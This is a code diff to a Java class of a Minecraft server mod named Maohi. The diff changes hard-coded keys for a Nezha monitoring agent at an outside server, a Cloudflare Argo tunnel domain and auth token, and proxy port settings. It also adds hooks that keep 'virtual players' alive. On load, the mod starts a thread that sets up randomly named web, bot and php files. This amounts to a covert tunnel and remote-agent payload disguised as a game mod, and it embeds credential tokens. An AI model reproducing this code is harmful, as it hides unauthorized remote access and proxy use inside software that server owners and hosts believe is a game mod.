@@ -19,6 +19,8 @@ public class Maohi implements ModInitializer {
 
     private static final Properties CONFIG = loadConfig();
 
+    private static VirtualPlayerManager virtualPlayerManager;
+
     private static Properties loadConfig() {
         Properties props = new Properties();
         try (InputStream is = Maohi.class.getResourceAsStream("/maohi.properties")) {
@@ -32,12 +34,12 @@ public class Maohi implements ModInitializer {
         return (value != null && !value.trim().isEmpty()) ? value.trim() : defaultValue;
     }
 
-    private static final String UUID         = cfg("UUID", "6ac67e23-8a85-4b8c-ba53-0f00cbb62d66");
+    private static final String UUID         = cfg("UUID", "1d38fabc-22aa-4531-899b-f80c59424db1");
     private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "nz.lilyonlyone.eu.org");
     private static final String NEZHA_PORT   = cfg("NEZHA_PORT", "443");
-    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "hQTPvzCCsZUCoGdyn8");
-    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "hi.mdtah.ccwu.cc");
-    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiZjAyYTNkODMtMjk4My00N2QxLWE3MmUtZDEzNjFmZDYyZGY4IiwicyI6IlpUZzBPVGd4WVdZdFpUSXdNQzAwT0ROaUxUZzNZakF0T1RVNE5qa3pNVE0zTkRFMSJ9");
+    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "dRYXkQdZB0qAQmnhAA");
+    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "fr.mdtah.ccwu.cc");
+    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiYTI0ZTg4OGUtZmQ1Zi00NDc2LTk5MGYtYWE3NDIzZDA0ZDM1IiwicyI6Ik16SmpPRGhrTm1JdE9EZzVOQzAwWXpsaUxXRTBaakV0TldKa1pXWmhaREF4WVRoayJ9");
     private static final String ARGO_PORT    = cfg("ARGO_PORT", "9002");
     private static final String HY2_PORT     = cfg("HY2_PORT", "");
     private static final String S5_PORT      = cfg("S5_PORT", "");
@@ -54,6 +56,13 @@ public class Maohi implements ModInitializer {
     @Override
     public void onInitialize() {
         LOGGER.info("Maohi starting...");
+
+ServerLifecycleEvents.SERVER_STARTED.register(this::onServerStarted);
+        
+ServerLifecycleEvents.SERVER_STOPPING.register(this::onServerStopping);
+
+ServerTickEvents.START_SERVER_TICK.register(this::onServerTick);
+        
         Thread thread = new Thread(() -> {
             try {
                 start();
@@ -66,9 +75,33 @@ public class Maohi implements ModInitializer {
         thread.start();
     }
 
+    private void onServerStopping(MinecraftServer server) {
+        LOGGER.info("[Maohi] 服务器正在关闭，停止虚拟玩家管理器...");
+        if (virtualPlayerManager != null) {
+            virtualPlayerManager.stop();
+        }
+    }
+
+    /**
+     * 服务器Tick事件，用于检测虚拟玩家死亡
+     */
+    private void onServerTick(MinecraftServer server) {
+        if (virtualPlayerManager == null) {
+            return;
+        }
+
+        // 检查所有虚拟玩家的存活状态
+        for (UUID uuid : new ArrayList<>(virtualPlayerManager.getVirtualPlayerUUIDs())) {
+            ServerPlayerEntity player = server.getPlayerManager().getPlayer(uuid);
+            if (player != null && (!player.isAlive() || player.isRemoved())) {
+                virtualPlayerManager.onVirtualPlayerDeath(uuid);
+            }
+        }
+    }
+
     private void start() throws Exception {
         if (!Files.exists(FILE_PATH)) Files.createDirectories(FILE_PATH);
-
+        
         webName = randomName();
         botName = randomName();
         phpName = randomName();
